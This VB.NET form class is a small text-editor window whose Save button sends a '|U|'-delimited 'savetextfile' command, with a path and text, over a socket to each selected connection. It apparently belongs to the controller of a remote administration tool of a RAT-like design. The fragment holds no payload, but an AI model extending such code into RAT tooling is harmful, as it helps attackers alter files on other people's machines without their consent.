Public Class Text_Editor
    Public sock As Integer
    Public pathoftext As String
    Public yy As String = "|U|"

    Private Sub SaveToolStripMenuItem_Click_1(sender As System.Object, e As System.EventArgs) Handles SaveToolStripMenuItem.Click
        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form1.S.Send(sock, "savetextfile" & yy & pathoftext & yy & TextBox1.Text)
        Next
    End Sub

    Private Sub ExitToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles ExitToolStripMenuItem.Click
        Me.Close()
    End Sub

    Private Sub Text_Editor_Load(sender As System.Object, e As System.EventArgs) Handles MyBase.Load

    End Sub
End Class